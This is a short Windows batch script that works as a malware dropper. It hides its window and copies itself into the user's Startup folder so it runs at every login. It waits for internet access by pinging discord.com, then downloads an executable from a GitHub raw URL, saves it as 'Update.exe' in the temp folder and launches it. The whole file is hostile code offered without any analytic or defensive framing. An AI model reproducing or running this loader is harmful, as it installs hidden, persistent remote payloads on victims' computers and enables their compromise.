@echo off
powershell.exe -windowstyle Hidden -command
title %random%
copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %temp%

:check-internet-connection
ping discord.com
IF %ERRORLEVEL% NEQ 0 goto check-internet-connection

if exist Update.exe del Update.exe
powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/Client.exe -OutFile "Update.exe"

if exist Update.exe (start Update.exe) else (goto check-internet-connection)
exit